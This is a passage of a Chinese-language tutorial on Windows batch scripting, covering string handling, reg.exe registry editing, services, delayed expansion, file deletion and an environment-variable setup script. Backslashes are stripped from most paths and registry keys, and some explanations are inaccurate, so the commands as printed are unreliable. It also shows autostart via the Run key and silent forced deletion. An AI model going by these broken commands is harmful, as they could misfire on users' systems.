		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8:灰色&nbsp;&nbsp;&nbsp; 9:淡蓝&nbsp;&nbsp;&nbsp; A:淡绿&nbsp;&nbsp;&nbsp; B:浅绿&nbsp;&nbsp;&nbsp; C:淡红&nbsp;&nbsp;&nbsp; D:淡紫&nbsp;&nbsp;&nbsp; E:淡黄&nbsp;&nbsp;&nbsp; F:亮白<br />
		&nbsp;&nbsp; 如果没有给定任何参数，该命令会将颜色还原到 CMD.EXE 启动时的颜色。<br />
		&nbsp;&nbsp; 如果两参数一样，视为无效输入。只有一个参数时，设置字体。<br />
		<br />
		4. random 命令<br />
		&nbsp;&nbsp; 产生随机数(正整数0~)<br />
		<br />
		5. exit 命令<br />
		&nbsp;&nbsp; 结束程序。即时是被调用的程序，结束后也不会返回原程序<br />
		<br />
		6. shutdown命令<br />
		&nbsp;&nbsp; shutdown -s 关机<br />
		<br />
		<br />
		10. 所有内置命令的帮助信息<br />
		&nbsp; ver /?<br />
		&nbsp; cmd /?<br />
		&nbsp; set /?<br />
		&nbsp; rem /?<br />
		&nbsp; if /?<br />
		&nbsp; echo /?<br />
		&nbsp; goto /?<br />
		&nbsp; for /?<br />
		&nbsp; shift /?<br />
		&nbsp; call /?<br />
		&nbsp; 其他需要的常用命令<br />
		&nbsp; type /?<br />
		&nbsp; find /?<br />
		&nbsp; findstr /?<br />
		&nbsp; copy /?<br />
		<br />
		<br />
		五、字符串处理<br />
		&nbsp;&nbsp;&nbsp; 1) 分割字符串，以查看时间为例<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %源字符串:~起始值,截取长度%&nbsp; (起始值从0开始；截取长度是可选的，如果省略逗号和截取长度，将会从起始值截取到结尾；<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 截取长度如果是负数，表示截取到倒数第几个。)</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time%&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示如：&quot;11:04:23.03&quot; (完整的时间&quot;hh:mm:ss.tt&quot;)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time:~0,5%&quot; 显示&quot;hh:mm&quot;(即&quot;11:04&quot;)，其中0表示从右向左移位操作的个数，5表示从左向右移位操作的个数<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time:~0,8%&quot; 显示标准时间格式&quot;hh:mm:ss&quot;(即&quot;11:04:23&quot;，前8个字符串)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time:~3,-3%&quot;显示&quot;mm:ss&quot;(即从第4个开始,截去最后3个的字符串)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time:~3%&quot;&nbsp;&nbsp; 显示&quot;04:23.03&quot;(即去掉前4个字符串)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;%time:~-3%&quot;&nbsp; 显示&quot;.tt&quot;(即最后3个字符串)</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 上面的字串分割格式，也可以用于其它地方，如目录路径：&quot;%cd:~0,10%&quot;</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 2) 替换字符串</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set a=&quot;abcd1234&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %a%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示：&quot;abcd1234&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set a=%a:1=kk%&nbsp;&nbsp;&nbsp; 替换&ldquo;1&rdquo;为&ldquo;kk&rdquo;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %a%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示：&quot;abcdkk234&quot;</p>
	<p align="left">
		<br />
		<br />
		&nbsp;&nbsp;&nbsp; 3) 字符串合并<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 由于没有直接的字符串合并函数，只能用笨方法了。</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set str1=%str1%%str2%&nbsp;&nbsp;&nbsp; (合并 str1 和 str2)</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 4) 计算字符串长度</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp; 没有现成的函数。如下程序利用 goto形成循环，不断将字符串截短1，并记录截短的次数，到字符串变成空时的次数即长度。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set testStr=This is a test string<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 将 testStr 复制到str，str 是个临时字符串<br />
		&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;set str=%testStr%<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 标签，用于goto跳转<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :next1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 判断str是不是空，如果不是则执行下边的语句<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if not &quot;%str%&quot;==&quot;&quot; (<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 算术运算，使num的值自增1，相当于num++或者++num语句<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set /a num+=1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 截取字符串，每次截短1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set &quot;str=%str:~1%&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 跳转到next1标签: 这里利用goto和标签，构成循环结构<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto next1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 当以上循环结构执行完毕时，会执行下边的语句<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo testStr=%testStr%<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo testStr的长度为：%num%</p>
	<p align="left">
		&nbsp;</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 5) 截取字符串时，需要传递参数<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接 echo %args:~%num%,-5% 没办法想要的字符串，需要如下两步</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setlocal enabledelayedexpansion<br />
		&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo !args:~%num%,-5!</p>
	<p align="left">
		<br />
		六、注册表操作<br />
		&nbsp;&nbsp;&nbsp; 1) 备份注册表，将[HKEY_LOCAL_MACHINE ... Run]的内容，备份到&ldquo;c:windows.reg&rdquo;</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg export HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun c:windows.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg export HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun c:windows.reg</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 2) 修改/添加注册表内容<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.一般的添加或修改</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;HKCUEnvironment&quot; /v Java_Home /t reg_sz /d &quot;D:Javajdk1.6.0_07&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 上句解析：&ldquo;HKCU&rdquo;是&ldquo;HKEY_CURRENT_USER&rdquo;的缩写，不用缩写用全称也可以；<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加名称为&ldquo;Java_Home&rdquo;的变量；类型为&ldquo;reg_sz&rdquo;，另一种常见类型是&ldquo;reg_dword&rdquo;；值为 D:Javajdk1.6.0_07；</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b.使用变量</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set SoftWareHome=HKEY_LOCAL_MACHINESOFTWAREJavaSoftJava<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%SoftWareHome%Web Start.6.0_07&quot; /v Home /t reg_sz /d &quot;%cd%jre1.6.0_07in&quot; /f</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c.如果注册表的名称有空格，或者数据用特殊符号时</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%SoftWareHome2%HelpCommands&quot; /v &quot;01:Online Documentation&quot; /t reg_sz /d &quot;&quot;%cd%DocumentationIndex.htm&quot;&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 传入值为(值用双引号括起来的)：&quot;D:ProgramFiles.work_softSybasePowerDesigner_12DocumentationIndex.htm&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%SoftWareHome2%Paths&quot; /v ReportTemplates /t reg_sz /d &quot;%cd%Resource FilesReport Templates&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 传入值为(&ldquo;&rdquo;结尾的)： E:Holemar.notes90. WindowsResource FilesReport Templates</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d.增加空的内容</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftShared ToolsMSConfigstartupregIMJPMIG8.1&quot;</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.添加或修改默认值</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%vpath%InstallPath&quot; /ve /t reg_sz /d &quot;%cd%&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 这里用&ldquo;/ve&rdquo;来代替一般修改时的&ldquo;/v 变量名&rdquo;,即可修改默认值了</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 3) 删除注册表的内容</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 双引号里面的是注册表的目录，下面两句将删除这目录下的所有信息<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg delete &quot;HKEY_CURRENT_USERSoftwareRealVNC&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg delete &quot;HKEY_LOCAL_MACHINESOFTWARERealVNC&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 双引号里面的是注册表的目录，下面一句将删除这目录下指定的某个信息<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg delete &quot;HKEY_LOCAL_MACHINESoftwareRealVNC&quot; /v VNC_Server /f</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp; 4) 注册表的常用位置<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.系统启动项：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun]</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp; example: REG ADD HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun /v VNC_Server /t REG_SZ /d &quot;%cd%VNC_Server.bat&quot; /f</p>
	<p align="left">
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b.系统环境变量：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSession ManagerEnvironment]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c.当前用户的环境变量：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [HKEY_CURRENT_USEREnvironment]<br />
		&nbsp;&nbsp;&nbsp; 5) 修改注册表之后，结束并重新加载explorer.exe进程，可刷新注册表，令其生效</p>
	<p align="left">
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; taskkill /f /im explorer.exe &gt;nul<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; start &quot;&quot; &quot;explorer.exe&quot;</p>
	<p align="left">
		<br />
		<br />
		<br />
		七、系统服务<br />
		&nbsp;&nbsp;&nbsp; 1) 停止服务：NET STOP 服务名<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 启动服务：NET Start 服务名<br />
		&nbsp;&nbsp;&nbsp; 2) 设置启动类型<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动：&nbsp; SC CONFIG 服务名 START= auto<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 手动：&nbsp; SC CONFIG 服务名 START= demand<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 已禁用：SC CONFIG 服务名 START= disabled<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附：&ldquo;START= &rdquo;等号后面必须要有一个空格。(start还有boot,system两个值)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sample:&nbsp; SC CONFIG Spooler START= demand (打印机加载项，设置成手动，默认自动)<br />
		&nbsp;&nbsp;&nbsp; 3) 查看系统服务：start %SystemRoot%system32services.msc /s<br />
		<br />
		八、setlocal与变量延迟<br />
		&nbsp; 0) 在没有开启变量延迟的情况下，某条命令行中的变量改变，必须到下一条命令才能体现。<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 另外例如for命令等，其后用一对圆括号闭合的所有语句也当作一行。<br />
		&nbsp;&nbsp;&nbsp;&nbsp; example:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set a=4<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set a=5 &amp; echo %a%<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 结果：4<br />
		&nbsp;&nbsp;&nbsp;&nbsp; 也可以对这种机制加以利用，如下的变量交换<br />
		&nbsp;&nbsp;&nbsp;&nbsp; example:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set var1=abc<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set var2=123<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 交换前： var1=%var1% var2=%var2%<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set var1=%var2%&amp; set var2=%var1%<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 交换后： var1=%var1% var2=%var2%<br />
		&nbsp; 1) 启动批处理文件中环境变量的本地化。本地化将持续到出现匹配的 endlocal 命令或者到达批处理文件结尾为止。<br />
		&nbsp;&nbsp;&nbsp; 语法: setlocal {enableextension | disableextensions} {enabledelayedexpansion | disabledelayedexpansion}<br />
		&nbsp;&nbsp;&nbsp; enableextension: 启用命令扩展，直到出现匹配的 endlocal 命令，无论 setlocal 命令之前的设置如何。<br />
		&nbsp;&nbsp;&nbsp; disableextensions: 禁用命令扩展，直到出现匹配的 endlocal 命令，无论 setlocal 命令之前的设置如何。<br />
		&nbsp;&nbsp;&nbsp; enabledelayedexpansion: 启用延迟的环境变量扩展，直到出现匹配的 endlocal 命令，无论 setlocal 命令之前的设置如何。<br />
		&nbsp;&nbsp;&nbsp; disabledelayedexpansion: 禁用延迟的环境变量扩展，直到出现匹配的 endlocal 命令，无论 setlocal 命令之前的设置如何。<br />
		<br />
		&nbsp; 2) 为了能够感知环境变量的动态变化，批处理设计了变量延迟。简单来说，在读取了一条完整的语句之后，不立即对该行的变量赋值，而会在某个单条语句执行之前再进行赋值，也就是说&ldquo;延迟&rdquo;了对变量的赋值。<br />
		&nbsp; examle:<br />
		&nbsp;&nbsp;&nbsp; setlocal enabledelayedexpansion<br />
		&nbsp;&nbsp;&nbsp; set a=4<br />
		&nbsp;&nbsp;&nbsp; set a=5 &amp; echo !a!<br />
		&nbsp; 结果： 5<br />
		&nbsp; 变量延迟的启动语句是&ldquo;setlocal enabledelayedexpansion&rdquo;，并且变量要用一对叹号&ldquo;!!&rdquo;括起来<br />
		&nbsp; 由于启动了变量延迟，所以批处理能够感知到动态变化，即不是先给该行变量赋值，而是在运行过程中给变量赋值，因此此时a的值就是5了<br />
		&nbsp; 另外，启动变量延迟，&ldquo;%&rdquo;的变量还是不变<br />
		&nbsp; example2:<br />
		&nbsp;&nbsp;&nbsp; setlocal enabledelayedexpansion<br />
		&nbsp;&nbsp;&nbsp; for /l %%i in (1,1,5) do (<br />
		&nbsp;&nbsp;&nbsp; set a=%%i<br />
		&nbsp;&nbsp;&nbsp; echo !a!<br />
		&nbsp;&nbsp;&nbsp; )<br />
		&nbsp; 结果，打印从1到5；如果不变量延迟，一个变量也没有打印<br />
		<br />
		<br />
		九、文件处理<br />
		&nbsp; 1.删除<br />
		&nbsp;&nbsp;&nbsp; 1) 删除一个文件或多个文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del /s /q /f d: esta.bat<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将直接删除d: esta.bat，没有任务提示<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del temp* /q /f /s<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将直接删除 本目录的 temp 目录的所有文件，没有任务提示<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 删除文件的时候可以使用&ldquo;*&rdquo;作通配符<br />
		&nbsp;&nbsp;&nbsp; 2) 删除一个空目录<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rd /q /s&nbsp; d: estlog<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将直接删除d: estlog目录，如果log目录里面有文件将无法删除<br />
		&nbsp;&nbsp;&nbsp; 3) 删除一个非空目录 (必须指定目录名称)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rmdir /q /s d: estlogs<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 必须指定目录名称，不能使用通配符<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /S&nbsp; 除目录本身外，还将删除指定目录下的所有子目录<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /Q&nbsp; 安静模式，带 /S 删除目录树时不要求确认<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 无论里面是否有文件或文件夹将全部直接删除<br />
		&nbsp; 2.创建目录<br />
		&nbsp;&nbsp;&nbsp; MKDIR [drive:]path<br />
		&nbsp;&nbsp;&nbsp; MD [drive:]path<br />
		&nbsp;&nbsp;&nbsp; 路径有空格时，可以用双引号括起来，也可以用 &amp;nbsp; 替代<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		实践部分:<br />
		======================================================================<br />
		<br />
		一、小摘录：<br />
		&nbsp;&nbsp;&nbsp; 1. 调用其他程序时，对文件的大小写不敏感，文件后缀也可忽略<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如：start LeapFTP.exe&nbsp; 与 start leapftp 效果一样，都是运行&ldquo;LeapFTP.exe&rdquo;文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 每行的开头的字符串会自动查找程序来运行，还可用双引号引起来(文件名或目录名含空格时必须用)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如：&quot;D:Program FilesLeap FTP.exe&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;LeapFTP.exe&quot; 可正常运行文件，start &quot;&quot; &quot;LeapFTP.exe&quot; 也可以正常运行文件(注意，第一个参数是窗口显示的标题)<br />
		&nbsp;&nbsp;&nbsp; 3. copy C: est*.* D:ack&nbsp; (复制C盘test文件夹的所有文件(不包括文件夹及子文件夹里的东西)到D盘的back文件夹)<br />
		&nbsp;&nbsp;&nbsp; 4. dir c:*.* &gt; a.txt　(将c盘文件列表写入 a.txt 中)<br />
		&nbsp;&nbsp;&nbsp; 5.&nbsp; &gt; 生成文件并写入内容(如果有这文件则覆盖)，&nbsp; &gt;&gt; 文件里追加内容<br />
		&nbsp;&nbsp;&nbsp; 6. md d:aa (创建文件夹)<br />
		&nbsp;&nbsp;&nbsp; 7. 在命令末尾加上&ldquo;&gt;NUL 2&gt;NUL&rdquo;，表示隐蔽返回信息。<br />
		&nbsp;&nbsp;&nbsp; 8. 等待用户输入： set /p 变量名=屏幕显示信息。&nbsp; Sample：set /p pass=请输入密码:<br />
		&nbsp;&nbsp;&nbsp; 9. 让用户按回车退出<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 小技巧(替代pause)，文件的最后一句：set /p tmp=操作结束，请按回车键退出...<br />
		&nbsp;&nbsp;&nbsp; 10.设置标题： title JDK安装<br />
		&nbsp;&nbsp;&nbsp; 11.设置屏幕显示颜色，如绿色: color 0a<br />
		&nbsp;&nbsp;&nbsp; 12.清屏： cls<br />
		&nbsp;&nbsp;&nbsp; 13.查看自己的IP：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /f &quot;tokens=15&quot; %%i in (&#39;ipconfig ^| find /i &quot;ip address&quot;&#39;) do set ip=%%i<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo %ip% (这时的 %ip% 就是自己的IP地址)<br />
		<br />
		&nbsp;&nbsp;&nbsp; 14. 修改文件的更新日期<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copy 文件名+,,&gt;nul&nbsp; (修改为当前时间，如果要修改为指定时间，先修改系统时间，再改回系统时间)<br />
		&nbsp;&nbsp;&nbsp; 15. 修改文件的后缀名<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ren C: est*.jpg *.JPG<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /r %%c in (*.jpg) do (ren %%c *.JPG)&nbsp; :: 修改当前目录下的所有文件的后缀名，包括子目录的<br />
		&nbsp;&nbsp;&nbsp; 16. 修改文件的文件名<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rename test.jpg test2.JPG<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rename *.jpg *.888.JPG<br />
		&nbsp;&nbsp;&nbsp; 17. 查看DNS、IP、Mac等<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1) Win98： winipcfg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2) Win2000以上： Ipconfig /all<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3) NSLOOKUP<br />
		&nbsp;&nbsp;&nbsp; 18.查看IP上的共享资源，就可以<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; net view 192.168.10.8<br />
		&nbsp;&nbsp;&nbsp; 19.共享<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A.查看你机器的共享资源: net share<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B.手工删除共享<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; net share 共享资源名称$ /d<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意$后有空格。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C.增加一个共享：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; net share mymovie=e:downloadsmovie /users:3<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mymovie 共享成功。 同时限制链接用户数为3人。<br />
		&nbsp;&nbsp;&nbsp; 20.打开某网站<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; start iexplore.exe http://www.baidu.com<br />
		<br />
		<br />
		二、实例：<br />
		&nbsp;&nbsp;&nbsp; 1. 生成 reg 文件，运行它，再删除它<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;更改windows安装文件的路径&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo Windows Registry Editor Version 5.00 &gt; c:setupreg.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionSetup] &gt;&gt; c:setupreg.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;ServicePackSourcePath&quot;=&quot;D:Win2003&quot; &gt;&gt; c:setupreg.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;SourcePath&quot;=&quot;D:Win2003&quot; &gt;&gt; c:setupreg.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 写入注册表<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; regedit /S c:setupreg.reg<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 删除注册表文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del c:setupreg.reg<br />
		<br />
		&nbsp;&nbsp;&nbsp; 2.调用了exe文件,结束后没有关闭，解决方式<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用start命令运行文件，如：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; start LeapFTP.exe 192.168.0.100<br />
		<br />
		&nbsp;&nbsp;&nbsp; 3.设置系统环境变量<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 有这个环境变量，则不需再设置，直接结束<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if not &quot;%JAVA_HOME%&quot; == &quot;&quot; exit<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 设置环境变量的地址<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set inputJavaHome=%cd%jdk1.6.0_07<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 设置环境变量，也可以设置当前用户的变量<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set EnvironmentHome=HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSession ManagerEnvironment<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 正在设置环境变量，请稍候......<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%EnvironmentHome%&quot; /v JAVA_HOME /t reg_sz /d &quot;%inputJavaHome%&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%EnvironmentHome%&quot; /v ClassPath /t reg_sz /d &quot;.;%%JAVA_HOME%%lib&quot; /f<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reg add &quot;%EnvironmentHome%&quot; /v Path /t reg_sz /d &quot;%%JAVA_HOME%%in;%Path%&quot; /f]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 刷新，令环境变量生效<br />
